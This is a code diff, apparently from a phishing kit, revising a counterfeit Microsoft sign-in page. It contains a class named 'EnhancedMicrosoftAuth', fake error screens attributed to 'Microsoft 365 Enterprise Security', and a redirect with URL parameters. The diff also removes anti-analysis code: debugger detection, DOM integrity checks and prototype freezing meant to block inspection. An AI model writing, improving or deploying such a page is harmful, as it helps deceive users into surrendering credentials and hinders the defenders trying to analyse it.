+                        document.querySelector('.loading-state').style.opacity = '0';
+                        setTimeout(() => {
+                            window.location.href = `404.html?${params.toString()}`;
+                        }, 500);
+                    } catch (error) {
+                        this.showError('Authentication service is temporarily unavailable. Please try again.');
+                        this.hideLoadingState();
+                    }
+                }
+
+                hideLoadingState() {
+                    const loginForm = document.getElementById('loginForm');
+                    const loadingState = document.getElementById('loadingState');
+                    
+                    loadingState.style.display = 'none';
+                    loginForm.style.display = 'block';
+                    
+                    setTimeout(() => {
+                        loginForm.style.opacity = '1';
+                        loginForm.style.transform = 'translateY(0)';
+                    }, 50);
+                }
+
+                showError(message) {
+                    const errorState = document.getElementById('errorState');
+                    errorState.querySelector('div:last-child').textContent = message;
+                    errorState.style.display = 'block';
+                    
+                    // Auto-hide after 5 seconds
+                    setTimeout(() => {
+                        errorState.style.display = 'none';
+                    }, 5000);
+                }
+
+                showSmartError() {
                     document.body.innerHTML = `
-                        <div class="loading-container">
+                        <div class="login-container">
                             <div class="ms-branding">
                                 <div class="ms-logo">MS</div>
-                                <h1 class="ms-title">Security Verification</h1>
+                                <h1 class="ms-title">Browser Compatibility</h1>
                             </div>
                             <div style="text-align: center; padding: 32px 0;">
-                                <div style="font-size: 16px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
-                                    Additional security verification required
+                                <div style="font-size: 48px; margin-bottom: 16px;">🔒</div>
+                                <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
+                                    Enhanced Security Enabled
                                 </div>
-                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 24px; line-height: 1.5;">
-                                    We've detected unusual activity that doesn't match your typical pattern.<br>
-                                    This extra check helps keep your account secure.
+                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 32px; line-height: 1.5;">
+                                    We've detected an unsupported browser configuration.<br>
+                                    Please use Microsoft Edge, Chrome, or Firefox for the best experience.
                                 </div>
-                                <div style="background: var(--gray-20); border: 1px solid var(--gray-30); border-radius: 4px; padding: 16px; margin: 20px 0;">
-                                    <div style="font-size: 13px; color: var(--gray-160); margin-bottom: 8px;">
-                                        <strong>Reference ID:</strong> SEC-${crypto.randomUUID().substr(0, 8).toUpperCase()}
-                                    </div>
-                                    <div style="font-size: 12px; color: var(--gray-130);">
-                                        If this persists, contact your IT administrator
-                                    </div>
-                                </div>
-                                <button onclick="window.location.href='index.html'" class="ms-button" style="max-width: 200px;">
-                                    Return to Sign In
+                                <button class="ms-button" onclick="window.location.reload()" style="max-width: 200px;">
+                                    Try Again
                                 </button>
                             </div>
                         </div>
                     `;
                 }
-
-                triggerEmergencyProtocol() {
-                    // Complete system lockdown
-                    document.body.innerHTML = `
-                        <div style="min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--gray-20); padding: 20px;">
-                            <div style="background: white; padding: 40px; border-radius: 4px; border: 1px solid var(--gray-30); text-align: center; max-width: 440px;">
-                                <div style="font-size: 24px; font-weight: 600; color: var(--gray-160); margin-bottom: 16px;">
-                                    Service Temporarily Unavailable
-                                </div>
-                                <div style="font-size: 15px; color: var(--gray-130); margin-bottom: 24px; line-height: 1.5;">
-                                    The document service is currently undergoing security maintenance.<br>
-                                    Please try again later.
-                                </div>
-                                <div style="font-size: 13px; color: var(--gray-130); opacity: 0.8;">
-                                    Microsoft 365 Enterprise Security
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    
-                    // Prevent any further navigation
-                    window.stop();
-                }
             }
 
-            // =============================================
-            // QUANTUM-RESISTANT INITIALIZATION
-            // =============================================
-            (function() {
-                // Advanced anti-tampering
-                Object.freeze(Object.prototype);
-                Object.freeze(Array.prototype);
-                Object.freeze(Function.prototype);
-                
-                // Memory protection
-                const originalValues = new WeakMap();
-                const protectedElements = [document.body, document.head, document.documentElement];
-                
-                protectedElements.forEach(element => {
-                    originalValues.set(element, element.outerHTML);
-                });
-
-                // Continuous integrity monitoring
-                setInterval(() => {
-                    protectedElements.forEach(element => {
-                        if (originalValues.get(element) !== element.outerHTML) {
-                            window.location.reload();
-                        }
-                    });
-                }, 100);
-
-                // Advanced debugger protection
-                const debuggerDetector = () => {
-                    const start = Date.now();
-                    debugger;
-                    if (Date.now() - start > 100) {
-                        window.location.reload();
-                    }
-                };
-                setInterval(debuggerDetector, 500);
-            })();
-
-            // =============================================
-            // MAIN EXECUTION WITH MILITARY PRECISION
-            // =============================================
+            // Enhanced initialization
             document.addEventListener('DOMContentLoaded', () => {
-                // Staggered initialization for security
+                // Add loading delay for better UX
                 setTimeout(() => {
-                    new DocumentSecurityProcessor();
-                }, 1000 + Math.random() * 1000);
+                    new EnhancedMicrosoftAuth();
+                }, 300);
             });
 
         })();
